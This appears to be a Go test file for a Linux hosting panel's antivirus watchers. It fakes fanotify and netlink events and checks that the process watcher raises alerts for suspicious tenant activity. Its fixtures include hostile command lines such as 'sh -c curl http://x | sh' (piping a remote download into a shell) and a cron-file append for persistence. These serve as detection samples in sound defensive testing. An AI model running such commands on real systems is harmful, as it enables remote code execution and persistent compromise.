//go:build linux

package antivirus

import (
	"context"
	"database/sql"
	"database/sql/driver"
	"encoding/binary"
	"errors"
	"fmt"
	"os/user"
	"reflect"
	"strings"
	"testing"
	"time"
	"unsafe"

	"golang.org/x/sys/unix"

	"servika/internal/avsettings"
	"servika/internal/notifications"
)

// fanotifyStep is what one poll or read of the fake descriptor answers. before
// runs first, for a test that has to act at that exact step.
type fanotifyStep struct {
	ready  int
	err    error
	data   []byte
	before func()
}

// fakeFanotify stands in for the fanotify descriptor. A poll with no step left
// waits briefly and reports nothing ready, so a refresh ticker can fire.
type fakeFanotify struct {
	initErr error
	markErr error
	polls   []fanotifyStep
	reads   []fanotifyStep
	marks   []string
	closed  []int
}

func withFakeFanotify(t *testing.T, f *fakeFanotify) {
	t.Helper()
	setForTest(t, &fanotifyInit, f.init)
	setForTest(t, &fanotifyMark, f.mark)
	setForTest(t, &pollFDs, f.poll)
	setForTest(t, &readFD, f.read)
	setForTest(t, &closeFD, f.close)
}

func (f *fakeFanotify) init(uint, uint) (int, error) { return 42, f.initErr }

func (f *fakeFanotify) mark(fd int, _ uint, mask uint64, _ int, path string) error {
	f.marks = append(f.marks, fmt.Sprintf("%d %d %s", fd, mask, path))
	return f.markErr
}

func (f *fakeFanotify) poll([]unix.PollFd, int) (int, error) {
	if len(f.polls) == 0 {
		time.Sleep(2 * time.Millisecond)
		return 0, nil
	}
	step := f.polls[0]
	f.polls = f.polls[1:]
	runBefore(step)
	return step.ready, step.err
}

func (f *fakeFanotify) read(_ int, p []byte) (int, error) {
	step := f.reads[0]
	f.reads = f.reads[1:]
	runBefore(step)
	return copy(p, step.data), step.err
}

func (f *fakeFanotify) close(fd int) error {
	f.closed = append(f.closed, fd)
	return nil
}

func runBefore(step fanotifyStep) {
	if step.before != nil {
		step.before()
	}
}

// fanotifyEvent is one event header as the kernel writes it.
func fanotifyEvent(vers uint8, fd int32) []byte {
	meta := unix.FanotifyEventMetadata{Event_len: eventMetaSize, Vers: vers, Metadata_len: uint16(eventMetaSize), Fd: fd}
	out := make([]byte, eventMetaSize)
	copy(out, unsafe.Slice((*byte)(unsafe.Pointer(&meta)), eventMetaSize))
	return out
}

func errText(err error) string {
	if err == nil {
		return ""
	}
	return err.Error()
}

// Every way the fanotify loop ends: a descriptor that cannot be made or marked,
// a poll or read that fails for good, an event layout this build cannot read, a
// stop, and watching turned off on a refresh.
func TestWatcherRunOutcomes(t *testing.T) {
	current := fanotifyEvent(unix.FANOTIFY_METADATA_VERSION, -1)
	host := avsettings.Settings{Scope: avsettings.ScopeHost, Realtime: true}
	server := avsettings.Settings{Scope: avsettings.ScopeServer, Realtime: true}
	noSettings := func(*sqlScript) {}
	cases := []struct {
		name     string
		watching avsettings.Settings
		fake     func(cancel context.CancelFunc) *fakeFanotify
		settings func(s *sqlScript)
		want     string
	}{
		{"a descriptor that cannot be made", host, func(context.CancelFunc) *fakeFanotify {
			return &fakeFanotify{initErr: unix.EPERM}
		}, noSettings, "fanotify_init: operation not permitted (CAP_SYS_ADMIN is required)"},
		{"a mark the kernel refuses", host, func(context.CancelFunc) *fakeFanotify {
			return &fakeFanotify{markErr: unix.EXDEV}
		}, noSettings, "fanotify_mark /home: invalid cross-device link (FAN_MARK_FILESYSTEM needs Linux 4.20 or newer)"},
		{"a poll that fails on a root that is its own filesystem", server, func(context.CancelFunc) *fakeFanotify {
			return &fakeFanotify{polls: []fanotifyStep{{err: unix.EINTR}, {err: unix.EBADF}}}
		}, noSettings, "poll: bad file descriptor"},
		{"a read that fails", host, func(context.CancelFunc) *fakeFanotify {
			return &fakeFanotify{polls: []fanotifyStep{{ready: 1}, {ready: 1}}, reads: []fanotifyStep{{err: unix.EAGAIN}, {err: unix.EIO}}}
		}, noSettings, "read: input/output error"},
		{"an event layout this build cannot read", host, func(context.CancelFunc) *fakeFanotify {
			return &fakeFanotify{polls: []fanotifyStep{{ready: 1}}, reads: []fanotifyStep{{data: fanotifyEvent(99, -1)}}}
		}, noSettings, fmt.Sprintf("the kernel reports fanotify metadata version 99, this build understands %d", unix.FANOTIFY_METADATA_VERSION)},
		{"a stop after an event with no descriptor", host, func(cancel context.CancelFunc) *fakeFanotify {
			return &fakeFanotify{polls: []fanotifyStep{{ready: 1}, {before: cancel}}, reads: []fanotifyStep{{data: current}}}
		}, noSettings, "context canceled"},
		{"watching turned off on a refresh", host, func(context.CancelFunc) *fakeFanotify {
			return &fakeFanotify{}
		}, func(s *sqlScript) {
			s.rows[avSettingsQuery] = avSettingsRow(avsettings.Settings{Scope: avsettings.ScopeHost})
		}, errWatchDisabled.Error()},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			ctx, cancel := context.WithCancel(t.Context())
			defer cancel()
			setForTest(t, &settingsRefresh, time.Millisecond)
			withFakeFanotify(t, c.fake(cancel))
			s := newScript()
			c.settings(s)
			w := &watcher{db: scriptDB(t, s), settings: c.watching}
			if got := errText(w.run(ctx)); got != c.want {
				t.Fatalf("run = %q, want %q", got, c.want)
			}
		})
	}
}

// A refresh that cannot read the settings keeps watching with the ones it has.
func TestWatcherRunKeepsWatchingWhenARefreshFails(t *testing.T) {
	setForTest(t, &settingsRefresh, time.Millisecond)
	ctx, cancel := context.WithCancel(t.Context())
	defer cancel()
	s := newScript()
	s.fail[avSettingsQuery] = errScripted
	fake := &fakeFanotify{polls: []fanotifyStep{
		{before: func() { time.Sleep(5 * time.Millisecond) }},
		{before: func() { time.Sleep(5 * time.Millisecond) }},
		{before: cancel},
	}}
	withFakeFanotify(t, fake)
	w := &watcher{db: scriptDB(t, s), settings: avsettings.Settings{Scope: avsettings.ScopeHost, Realtime: true}}
	err := w.run(ctx)
	if !errors.Is(err, context.Canceled) || !strings.Contains(strings.Join(s.steps, "\n"), avSettingsQuery) ||
		!reflect.DeepEqual(fake.closed, []int{42}) || !reflect.DeepEqual(fake.marks, []string{fmt.Sprintf("42 %d /home", unix.FAN_CLOSE_WRITE)}) {
		t.Fatalf("run = %v, closed %v, marks %q", err, fake.closed, fake.marks)
	}
}

// netlinkStep is what one receive on the fake netlink socket answers.
type netlinkStep struct {
	data []byte
	from unix.Sockaddr
	err  error
}

type fakeNetlink struct{ steps []netlinkStep }

// recv answers the next step, and a closed socket once every step is used.
func (f *fakeNetlink) recv(_ int, p []byte, _ int) (int, unix.Sockaddr, error) {
	if len(f.steps) == 0 {
		return 0, nil, unix.EBADF
	}
	step := f.steps[0]
	f.steps = f.steps[1:]
	return copy(p, step.data), step.from, step.err
}

// netlinkMessage wraps a connector payload in its netlink header.
func netlinkMessage(payload []byte) []byte {
	msg := make([]byte, 16, 16+len(payload))
	binary.LittleEndian.PutUint32(msg[0:], uint32(16+len(payload)))
	binary.LittleEndian.PutUint16(msg[4:], 3)
	return append(msg, payload...)
}

func newProcWatcher(db *sql.DB) *procWatcher {
	return &procWatcher{db: db, throttle: map[string]time.Time{}, pidTable: map[int]*pidRecord{},
		uidName: map[int]string{}, buckets: map[int]*bucket{}}
}

// The loop survives the transient errors, drops an event no kernel sent, applies
// a kernel event, sweeps the stale records, and stops on a read that fails for
// good.
func TestProcWatcherLoop(t *testing.T) {
	setForTest(t, &procSweepInterval, 0)
	exit := func(pid uint32) []byte {
		return netlinkMessage(charConnectorPayload(cnIdxProc, cnValProc, procEventExit, pid, pid))
	}
	kernel := &unix.SockaddrNetlink{Family: unix.AF_NETLINK}
	fake := &fakeNetlink{steps: []netlinkStep{
		{err: unix.EINTR},
		{err: unix.ENOBUFS},
		{data: exit(44), from: &unix.SockaddrNetlink{Family: unix.AF_NETLINK, Pid: 9}},
		{data: exit(44), from: &unix.SockaddrInet4{}},
		{data: exit(45), from: kernel},
	}}
	setForTest(t, &recvNetlink, fake.recv)
	w := newProcWatcher(nil)
	now := time.Now()
	w.pidTable[44] = &pidRecord{born: now}
	w.pidTable[45] = &pidRecord{born: now}
	w.pidTable[46] = &pidRecord{born: now.Add(-10 * time.Minute)}
	w.throttle["7:old"] = now.Add(-2 * time.Hour)
	w.buckets[1001] = &bucket{tokens: procRateBurst, refilled: now}

	w.loop(3)
	if _, ok := w.pidTable[44]; !ok || len(w.pidTable) != 1 || len(w.throttle) != 0 || len(w.buckets) != 0 {
		t.Fatalf("pid table %v, throttle %v, buckets %v", w.pidTable, w.throttle, w.buckets)
	}
}

// procHarness fakes one process as /proc describes it, the uid lookup and both
// places an alert goes.
type procHarness struct {
	w       *procWatcher
	script  *sqlScript
	notes   []notifications.Event
	chains  []string
	noteErr error
}

type fakeProcess struct {
	exe, cmdline, comm, username string
	uid                          int
}

func newProcHarness(t *testing.T, p fakeProcess) *procHarness {
	t.Helper()
	ph := &procHarness{script: newScript()}
	ph.script.rows["SELECT id FROM domains WHERE system_user=? AND parent_domain_id IS NULL LIMIT 1"] = [][]driver.Value{{int64(7)}}
	ph.script.rows["SELECT domain_name FROM domains WHERE id=?"] = [][]driver.Value{{"example.com"}}
	ph.w = newProcWatcher(scriptDB(t, ph.script))
	setForTest(t, &readProcExe, func(int) string { return p.exe })
	setForTest(t, &readProcCmdline, func(int) string { return p.cmdline })
	setForTest(t, &readProcUID, func(int) int { return p.uid })
	setForTest(t, &readProcStat, func(int) (int, string) { return 1, p.comm })
	setForTest(t, &lookupUserID, func(string) (*user.User, error) { return &user.User{Username: p.username}, nil })
	setForTest(t, &writeNotification, ph.writeNote)
	setForTest(t, &writeChainEvent, ph.writeChain)
	return ph
}

func (ph *procHarness) writeNote(_ context.Context, _ *sql.DB, e notifications.Event) error {
	ph.notes = append(ph.notes, e)
	return ph.noteErr
}

func (ph *procHarness) writeChain(_ *sql.DB, domainID int64, source, stage, level, summary, path string, pid int, refType string, refID int64) {
	ph.chains = append(ph.chains, fmt.Sprintf("%d %s %s %s %q %s %d %s %d", domainID, source, stage, level, summary, path, pid, refType, refID))
}

// A web server's own exec marks it as a web ancestor, whether or not the table
// already knew it, and reports nothing.
func TestEvaluateMarksAWebServer(t *testing.T) {
	ph := newProcHarness(t, fakeProcess{exe: "/usr/sbin/php-fpm", comm: "php-fpm", uid: 48, username: "apache"})
	ph.w.pidTable[101] = &pidRecord{}
	ph.w.evaluate(100)
	ph.w.evaluate(101)
	if !ph.w.pidTable[100].web || !ph.w.pidTable[101].web || len(ph.notes) != 0 {
		t.Fatalf("pid table %+v, notes %d", ph.w.pidTable, len(ph.notes))
	}
}

func domainParams(extra ...string) map[string]any {
	params := map[string]any{"domain": "example.com"}
	for i := 0; i+1 < len(extra); i += 2 {
		params[extra[i]] = extra[i+1]
	}
	return params
}

// Each kind of process finding writes its own alert and its own chain stage, and
// is throttled afterwards.
func TestEvaluateReportsATenantProcess(t *testing.T) {
	domainID := int64(7)
	cases := []struct {
		name  string
		p     fakeProcess
		web   bool
		event notifications.Event
		chain string
	}{
		{"a web shell command", fakeProcess{exe: "/bin/sh", cmdline: "sh -c curl http://x | sh", comm: "sh", uid: 1001, username: "c_site"}, true,
			notifications.Event{Level: notifications.LevelCritical, Key: "procwatch.webShellCmd", Params: domainParams(),
				Message: "A web process ran a suspicious command on example.com."},
			`7 process execution critical "" /bin/sh 200 av_proc 0`},
		{"a web download", fakeProcess{exe: "/usr/bin/curl", cmdline: "curl -s http://x/a", comm: "curl", uid: 1001, username: "c_site"}, true,
			notifications.Event{Level: notifications.LevelWarning, Key: "procwatch.webDownloader", Params: domainParams(),
				Message: "A web process started a remote download on example.com."},
			`7 process c2 warning "" /usr/bin/curl 200 av_proc 0`},
		{"a web persistence change", fakeProcess{exe: "/bin/echo", cmdline: "echo x >> /var/spool/cron/c_site", comm: "echo", uid: 1001, username: "c_site"}, true,
			notifications.Event{Level: notifications.LevelCritical, Key: "procwatch.webPersistence", Params: domainParams(),
				Message: "A web process attempted a persistence change on example.com."},
			`7 process persistence critical "" /bin/echo 200 av_proc 0`},
		{"a binary run from /tmp", fakeProcess{exe: "/tmp/x", comm: "x", uid: 1001, username: "c_site"}, false,
			notifications.Event{Level: notifications.LevelCritical, Key: "procwatch.untrustedOrigin", Params: domainParams("location", "tmp"),
				Message: "A process ran from an untrusted location (tmp) on example.com."},
			`7 process execution critical "" /tmp/x 200 av_proc 0`},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			ph := newProcHarness(t, c.p)
			ph.noteErr = errScripted
			ph.w.pidTable[200] = &pidRecord{web: c.web}
			ph.w.evaluate(200)
			want := c.event
			want.Category, want.Title, want.DomainID, want.RefType = notifyCategory, "Suspicious process activity", &domainID, "av_proc"
			if len(ph.notes) != 1 || !reflect.DeepEqual(ph.notes[0], want) || !reflect.DeepEqual(ph.chains, []string{c.chain}) {
				t.Fatalf("notes %+v\nchains %q", ph.notes, ph.chains)
			}
			ph.w.evaluate(200)
			if len(ph.notes) != 1 {
				t.Fatal("a repeated finding was not throttled")
			}
		})
	}
}

// quietPID is a pid no process on a test host holds, so the ancestry walk that
// falls back to /proc finds nothing there.
const quietPID = 999999

// Every reason evaluate reports nothing.
func TestEvaluateStaysQuiet(t *testing.T) {
	shell := fakeProcess{exe: "/bin/sh", cmdline: "sh -c curl http://x | sh", comm: "sh", uid: 1001, username: "c_site"}
	system := shell
	system.username = "apache"
	cases := []struct {
		name    string
		p       fakeProcess
		prepare func(ph *procHarness)
	}{
		{"an ordinary process with no fork record", fakeProcess{exe: "/usr/bin/php", cmdline: "php artisan queue:work", comm: "php", uid: 1001, username: "c_site"},
			func(ph *procHarness) { delete(ph.w.pidTable, quietPID) }},
		{"a tenant over its rate", shell, func(ph *procHarness) { ph.w.buckets[1001] = &bucket{refilled: time.Now()} }},
		{"a system account", system, func(*procHarness) {}},
		{"a tenant with no domain", shell, func(ph *procHarness) {
			ph.script.rows["SELECT id FROM domains WHERE system_user=? AND parent_domain_id IS NULL LIMIT 1"] = [][]driver.Value{}
		}},
		{"an alert sent a moment ago", shell, func(ph *procHarness) { ph.w.throttle["7:webShellCmd"] = time.Now() }},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			ph := newProcHarness(t, c.p)
			ph.w.pidTable[quietPID] = &pidRecord{web: true}
			c.prepare(ph)
			ph.w.evaluate(quietPID)
			if len(ph.notes) != 0 || len(ph.chains) != 0 {
				t.Fatalf("notes %+v, chains %q", ph.notes, ph.chains)
			}
		})
	}
}
